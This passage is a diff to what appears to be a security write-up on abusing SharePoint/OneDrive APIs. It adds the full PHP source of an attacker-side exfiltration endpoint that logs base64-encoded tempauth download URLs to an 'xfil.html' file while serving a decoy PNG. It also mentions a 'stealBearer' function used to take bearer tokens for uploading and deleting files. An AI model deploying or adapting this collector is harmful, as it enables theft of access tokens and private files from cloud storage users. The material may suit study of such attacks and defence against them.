@@ -26,6 +26,27 @@ The API provided us with a url with the tempauth parameter that allows anyone wi
 https://REDACTED-my.sharepoint.com/personal/REDACTED/_layouts/15/download.aspx?UniqueId=REDACTED&Translate=false&tempauth=<<<<TOKEN!!!>>>>&ApiVersion=2.1
 ```
 
+### What is in spimage.php?
+
+```
+<?php
+header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Headers: *");
+header("Access-Control-Allow-Methods: *");
+header('Content-Type: image/png');
+
+$url = $_GET["auth_url"];
+$file_name = $_GET["name"];
+if(isset($_GET['auth_url']) && !empty($_GET['name']))
+{
+	$data = "<p><a href='".base64_decode($url)."'>".$file_name."</a></p>\r\n";
+	file_put_contents('./REDACTED/xfil.html', $data , FILE_APPEND);
+}
+echo file_get_contents('http://REDACTED/tiny.png');
+?>
+
+```
+
 ## Upload and Delete
 The Upload and Delete required obtaining tokens from another requests This can be seen in the following function calls of delete_files.js
 - stealBearer
